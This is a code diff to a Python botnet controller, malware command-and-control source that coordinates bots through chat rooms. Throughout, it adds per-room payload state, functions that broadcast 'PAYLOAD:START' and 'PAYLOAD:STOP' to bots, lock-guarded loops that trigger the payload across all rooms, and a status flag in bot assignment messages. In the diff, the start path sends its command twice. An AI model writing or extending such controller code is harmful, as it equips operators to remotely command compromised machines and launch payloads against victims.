@@ -40,11 +40,14 @@ class Bot:
 class CommandRoom:
     bots: dict[str, list[Bot, bool]]
     room: Room
-    
+    payload_status: bool
+
     def __init__(self, room):
         self.room = room
         self.bots = {}
-        
+        self.payload_status = False
+
+
     def __str__(self):
         return f"{self.bots}"
     
@@ -75,6 +78,14 @@ class CommandRoom:
     
     def delete_inactive_bots(self):
         self.bots = {k: bot for k, bot in self.bots.items() if bot[1] == True}
+
+    def start_payload(self):
+        self.send_cmd("PAYLOAD:START")
+        self.payload_status = True
+
+    def stop_payload(self):
+        self.send_cmd("PAYLOAD:STOP")
+        self.payload_status = False
 
     def leave(self) -> bool:
         return self.room.leave()
@@ -173,7 +184,7 @@ class BotnetController:
             if not self.command_room_lock.acquire(False):
                 return
             self.announce_room.send_text(
-                f"RESOLVE {botid}:{room_id}"
+                f"RESOLVE {botid}:{"E" if self.command_rooms[room_id].payload_status else "D"}:{room_id}"
             )
             self.assign_bot(msgbody, room_id)
             self.command_room_lock.release()
@@ -208,16 +219,21 @@ class BotnetController:
             self.command_rooms[new_room.room_id] = CommandRoom(new_room)
 
     def start_payload_on_room(self, room: CommandRoom):
+        room.start_payload()
         self.send_command("PAYLOAD:START", room)
     
     def start_payload_all_rooms(self):
-        self.send_to_all("PAYLOAD:START")
+        with self.command_room_lock:
+            for _, cmd_room in self.command_rooms.items():
+                self.start_payload_on_room(cmd_room)
 
     def stop_payload_on_room(self, room: CommandRoom):
-        self.send_command("PAYLOAD:STOP", room)
+        room.stop_payload()
     
     def stop_payload_all_rooms(self):
-        self.send_to_all("PAYLOAD:STOP")
+        with self.command_room_lock:
+            for _, cmd_room in self.command_rooms.items():
+                self.stop_payload_on_room(cmd_room)
 
     def ping_loop(self):
         while True:
